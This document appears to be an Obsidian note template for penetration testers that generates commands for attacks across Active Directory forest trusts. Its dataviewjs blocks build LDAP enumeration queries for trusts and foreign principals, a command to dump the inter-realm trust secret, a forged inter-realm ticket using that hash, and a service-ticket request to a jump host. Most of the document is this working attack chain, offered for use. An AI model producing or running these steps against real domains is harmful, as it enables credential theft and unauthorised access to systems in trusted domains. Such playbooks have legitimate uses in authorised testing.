---
target1_ip: 
target1_domain: 
target1_ports: 
target1_os: 
target1_is_ad: 
target1_dc_ip: 
c: 0
user_sid: asdfas
distance: 234234
rating: Done
ldap_tool: impacket
trusted_domain: partner.com
domain: domain.local
full_domain: dc-1.partner.com
full_domain_jump: jump.partner.com
username: test
password: password
secrets_tool: sharpldap
---
```dataviewjs
const file = app.vault.getAbstractFileByPath("Templates/utils.md");
if (file) {
  const script = await app.vault.read(file);
  eval(script);
} else {
  dv.paragraph("❌ Could not load utils.md");
}
```
## Forest Attacks

```dataviewjs
const L_SEARCH = "ldapsearch";
const IMPACK = "impacket";
const PV = "powerview";
const S_LDAP = "sharpldap";
const domain_default = dv.current().domain ?? "domain.local";
const dropDown = `\`INPUT[inlineSelect(defaultValue(${IMPACK}),option(${L_SEARCH}),option(${IMPACK}),option(${PV}),option(${S_LDAP})):ldap_tool]\``;
const PassworddropDown = `\`INPUT[inlineSelect(defaultValue(${IMPACK}),option(${L_SEARCH}),option(${IMPACK}),option(${PV}),option(${S_LDAP})):secrets_tool]\``;
const domain_input = `\`INPUT[text(defaultValue('${domain_default}')):domain]\``;
const username = `\`INPUT[text:username]\``;
const password = `\`INPUT[text:password]\``;

dv.table(
  ["Configurations"], 
  [
    ["LDAP tools: ", dropDown],
    ["Secrets Dump tools: ", PassworddropDown],
    ["Domain: ", domain_input],
    ["Username: ", username],
    ["Password: ", password],
  ]
);
```
### Discover Forest trust
```dataviewjs
const ldap_tool = dv.current().ldap_tool;
const domain = dv.current().domain;
const domain_parts = domain.split('.').map(p => `DC=${p}`).join(',');

const query = buildQueryForTool({
  tool: ldap_tool,
  domain: domain,
  base: domain_parts,
  filter: "(objectClass=trustedDomain)",
  attributes: "trustDirection,trustPartner,trustAttributes,flatname"
});

dv.paragraph("```bash\n" + query + "\n```");
```
Trust Domain: `INPUT[text:trusted_domain]`

Determine the trust direction  
0 - No Trust  
1 - Inbound  
2 - Outbound  
3 - Bidirectional
## One-Way Inbound Trusts
```dataviewjs
const ldap_tool = dv.current().ldap_tool;
const trusted_domain = dv.current().trusted_domain;
const domain_parts = trusted_domain.split('.').map(part => `DC=${part}`).join(',');

const query = buildQueryForTool({
  tool: ldap_tool,
  domain: trusted_domain,
  base: domain_parts,
  filter: "(objectClass=foreignSecurityPrincipal)",
  attributes: "cn,memberOf"
});

dv.paragraph("```bash\n" + query + "\n```");
```
Example SID: `S-1-5-21-4138355267-8561541534-956542865-6102`  
Enter SID: `INPUT[text:user_sid]`
### Enumerate the user
```dataviewjs
const user_sid = dv.current().user_sid;
const ldap_tool = dv.current().ldap_tool;
dv.paragraph("```bash\n" + `${ldap_tool} (objectSid=${user_sid})` + "\n```");
```

Enter User: `INPUT[text:username]`
### RID for current domain
```dataviewjs
const username = dv.current().username;
const ldap_tool = dv.current().ldap_tool;
dv.paragraph("```bash\n" + `${ldap_tool} (sAMAccountName=${username})` + "\n```");
```

Enter RID: `INPUT[text:own_domain_rid]`
```dataviewjs
const ldap_tool = dv.current().ldap_tool;
const trusted_domain = dv.current().trusted_domain ?? "";
const domain_parts = trusted_domain.split('.').map(part => `DC=${part}`).join(',');

const query = buildQueryForTool({
  tool: ldap_tool,
  domain: trusted_domain,
  base: domain_parts,
  filter: "(samAccountType=805306369)",
  attributes: "samAccountName"
});

dv.paragraph("```bash\n" + query + "\n```");
```

```dataviewjs
const domain_input = `\`INPUT[text:full_domain]\``;
const jump_box = `\`INPUT[text:full_domain_jump]\``;

dv.table(
  ["Domain Information"], 
  [
    ["Fully Qualified Domain Name (Trusted DC): ", domain_input],
    ["Fully Qualified Domain Name (Trusted Shared): ", jump_box],
  ]
);
```
### Forging the Ticket
```dataviewjs
const ldap_tool = dv.current().ldap_tool;
const secrets_tool = dv.current().secrets_tool;
const domain = dv.current().domain;
const trusted_domain = dv.current().trusted_domain ?? "";
const inner_domain_secret = `${domain.split('.')[0].toUpperCase()}\${trusted_domain.split('.')[0].toUpperCase()}$`;

dv.paragraph("```bash\n" + `${secrets_tool ?? 'Not tool Selected'} ${domain ?? 'No Domain'} ${inner_domain_secret}` + "\n```");
```

Enter NTLM Hash: `INPUT[text:krtgt_hash]`
```dataviewjs
const user_sid = dv.current().user_sid;
const ticket_tool = dv.current().ticket_tool ?? "No tool selected";
const domain = dv.current().domain;
const trusted_domain = dv.current().trusted_domain ?? "";
const krtgt_hash = dv.current().krtgt_hash;
const user_id = dv.current().own_domain_rid;
const username = dv.current().username;

dv.paragraph("```bash\n" + `${ticket_tool} silver /user:${username}$ /domain:${domain}$ /sid:${user_sid}$ /id:${user_id}$ /groups:513,1106,6102 /service:krbtgt/${trusted_domain} /rc4:${krtgt_hash} /nowrap` + "\n```");
```
Enter TGT Ticket: `INPUT[text:tgt_ticket]`

```dataviewjs
const full_domain = dv.current().full_domain;
const jump_box = dv.current().full_domain_jump;
const ticket_tool = dv.current().ticket_tool ?? "No tool selected";
const tgt_ticket = dv.current().tgt_ticket;

dv.paragraph("```bash\n" + `${ticket_tool} asktgs /service:cifs/${jump_box} /dc:${full_domain} /ticket:${tgt_ticket} /nowrap` + "\n```");
```
